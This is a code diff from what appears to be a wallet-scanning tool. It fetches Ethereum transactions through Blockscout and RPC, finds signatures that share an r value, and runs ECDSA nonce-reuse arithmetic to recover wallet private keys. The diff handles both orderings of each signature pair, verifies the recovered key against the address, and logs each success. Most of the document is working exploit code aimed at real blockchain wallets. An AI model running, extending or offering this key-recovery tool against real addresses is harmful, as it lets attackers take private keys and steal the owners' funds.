@@ -44,12 +44,17 @@ const RPC_ENDPOINTS: Record<string, string> = {
 // Etherscan V2 key (optional — speeds up + enables more chains if provided)
 const ETHERSCAN_KEY = process.env.ETHERSCAN_API_KEY ?? "";
 
-// ── Rate limiter ──────────────────────────────────────────────────────────────
-let _lastCall = 0;
-async function rateLimitedFetch(url: string, options?: RequestInit): Promise<Response> {
-  const gap = 220 - (Date.now() - _lastCall);   // ~4.5 req/sec
+// ── Rate limiters — separate for explorer API vs RPC ─────────────────────────
+let _lastBlockscout = 0;
+async function blockscoutFetch(url: string): Promise<Response> {
+  const gap = 250 - (Date.now() - _lastBlockscout); // 4 req/sec — respect free-tier limits
   if (gap > 0) await delay(gap);
-  _lastCall = Date.now();
+  _lastBlockscout = Date.now();
+  return fetch(url, { signal: AbortSignal.timeout(20_000) });
+}
+
+// RPC calls go directly — publicnode handles concurrent requests well
+async function rateLimitedFetch(url: string, options?: RequestInit): Promise<Response> {
   return fetch(url, { signal: AbortSignal.timeout(20_000), ...options });
 }
 
@@ -119,38 +124,73 @@ export interface RecoveryResult {
 }
 
 // ── Core recovery math ────────────────────────────────────────────────────────
+// Attempts one ordering of (z1,s1) vs (z2,s2). Returns null if degenerate.
+function attemptRecovery(
+  r: bigint, s1: bigint, s2: bigint, z1: bigint, z2: bigint,
+): { k: bigint; d: bigint } | null {
+  const den = modN(s1 - s2);
+  if (den === 0n) return null;                      // s1 === s2 — not a reuse case
+  const k = modN(modN(z1 - z2) * modInverse(den, CURVE_N));
+  if (k === 0n) return null;                        // degenerate nonce
+  const d = modN(modN(s1 * k - z1) * modInverse(r, CURVE_N));
+  if (d === 0n) return null;                        // degenerate key
+  return { k, d };
+}
+
 export function recoverPrivateKey(params: {
   r: string; s1: string; s2: string;
   z1: string; z2: string; address: string;
 }): RecoveryResult {
   try {
-    const r  = BigInt(params.r);
-    const s1 = BigInt(params.s1);
-    const s2 = BigInt(params.s2);
-    const z1 = BigInt(params.z1);
-    const z2 = BigInt(params.z2);
+    const rB  = BigInt(params.r);
+    const s1B = BigInt(params.s1);
+    const s2B = BigInt(params.s2);
+    const z1B = BigInt(params.z1);
+    const z2B = BigInt(params.z2);
 
-    const den = modN(s1 - s2);
-    if (den === 0n) return fail("s1 === s2 — identical s values, not a nonce reuse case");
+    // Guard: if BOTH z values are zero, z reconstruction failed — cannot recover
+    const ZERO64 = BigInt("0x" + "0".repeat(64));
+    if (z1B === ZERO64 && z2B === ZERO64) {
+      return fail("z-value reconstruction failed for both transactions — cannot recover key");
+    }
 
-    // k = (z1 - z2) · (s1 - s2)⁻¹ mod n
-    const k = modN(modN(z1 - z2) * modInverse(den, CURVE_N));
-    if (k === 0n) return fail("Recovered k = 0 — degenerate case");
+    // Try both orderings — the correct one will produce an address that matches
+    const orderings: Array<[bigint, bigint, bigint, bigint]> = [
+      [s1B, s2B, z1B, z2B],   // ordering A
+      [s2B, s1B, z2B, z1B],   // ordering B (swapped)
+    ];
 
-    // d = (s1·k - z1) · r⁻¹ mod n
-    const d = modN(modN(s1 * k - z1) * modInverse(r, CURVE_N));
-    if (d === 0n) return fail("Recovered d = 0 — degenerate case");
+    for (const [sa, sb, za, zb] of orderings) {
+      const res = attemptRecovery(rB, sa, sb, za, zb);
+      if (!res) continue;
 
-    const privKeyHex = "0x" + d.toString(16).padStart(64, "0");
-    let derivedAddress: string | null = null;
-    let addressMatches = false;
-    try {
-      const wallet = new ethers.Wallet(privKeyHex);
-      derivedAddress = wallet.address;
-      addressMatches = derivedAddress.toLowerCase() === params.address.toLowerCase();
-    } catch {}
+      const privKeyHex = "0x" + res.d.toString(16).padStart(64, "0");
+      const nonceKHex  = "0x" + res.k.toString(16).padStart(64, "0");
 
-    return { success: true, privateKey: privKeyHex, nonceK: "0x" + k.toString(16).padStart(64, "0"), derivedAddress, addressMatches, error: null };
+      let derivedAddress: string | null = null;
+      let addressMatches = false;
+      try {
+        const wallet = new ethers.Wallet(privKeyHex);
+        derivedAddress = wallet.address;
+        addressMatches = derivedAddress.toLowerCase() === params.address.toLowerCase();
+      } catch { /* invalid key scalar — try next ordering */ }
+
+      // Return immediately on verified match
+      if (addressMatches) {
+        logger.warn(
+          { address: params.address, privKey: privKeyHex.slice(0, 10) + "...", sharedR: params.r.slice(0, 10) + "..." },
+          "🔑 PRIVATE KEY RECOVERED — ECDSA nonce reuse confirmed",
+        );
+        return { success: true, privateKey: privKeyHex, nonceK: nonceKHex, derivedAddress, addressMatches: true, error: null };
+      }
+
+      // Return unverified result if we at least got a key (address might be checksum mismatch or multi-sig)
+      if (derivedAddress) {
+        return { success: true, privateKey: privKeyHex, nonceK: nonceKHex, derivedAddress, addressMatches: false, error: "Key recovered but derived address does not match — possible z-value inaccuracy" };
+      }
+    }
+
+    return fail("Both orderings produced degenerate results — s values may be identical or z reconstruction failed");
   } catch (err) {
     return fail(String(err));
   }
@@ -178,7 +218,7 @@ async function fetchOutgoingTxHashesBlockscout(
     }
 
     try {
-      const res  = await rateLimitedFetch(url);
+      const res  = await blockscoutFetch(url);
       if (!res.ok) {
         logger.warn({ status: res.status, url }, "Blockscout non-OK response");
         break;
@@ -207,7 +247,7 @@ async function fetchOutgoingTxHashesBlockscout(
         break; // no more pages
       }
 
-      pages++;
+      if (++pages >= 100) break; // 100 pages × 50 items = up to 5,000 transactions per wallet
     } catch (err) {
       logger.warn({ err, address }, "Blockscout fetch error");
       break;
@@ -350,11 +390,38 @@ function buildResult(
   for (const [r, group] of Object.entries(rGroups)) {
     if (group.length < 2) continue;
     rPairs[r] = group.map(g => g.txHash);
+
+    // Loud log — shared r detected, decoder about to fire
+    logger.warn(
+      { address, sharedR: r.slice(0, 14) + "...", txCount: group.length },
+      "⚠️  DUPLICATE SIGNATURE DETECTED — shared r value across " + group.length + " transactions — running key decoder",
+    );
+
     for (let i = 0; i < group.length; i++) {
       for (let j = i + 1; j < group.length; j++) {
         const t1 = group[i];
         const t2 = group[j];
+
+        // Run the private-key decoder
         const recovery = recoverPrivateKey({ r: t1.r, s1: t1.s, s2: t2.s, z1: t1.z, z2: t2.z, address });
+
+        logger.warn(
+          {
+            address,
+            tx1: t1.txHash,
+            tx2: t2.txHash,
+            recoverySuccess: recovery.success,
+            addressMatches:  recovery.addressMatches,
+            privateKey:      recovery.privateKey ? recovery.privateKey.slice(0, 10) + "..." : null,
+            error:           recovery.error,
+          },
+          recovery.success && recovery.addressMatches
+            ? "🔓 KEY DECODER SUCCESS — private key verified against wallet address"
+            : recovery.success
+            ? "⚡ KEY DECODER — key candidate generated (address verification failed)"
+            : "✗  KEY DECODER FAILED — " + recovery.error,
+        );
+
         nonceReusePairs.push({
           sharedR:   r,
           tx1:       t1,
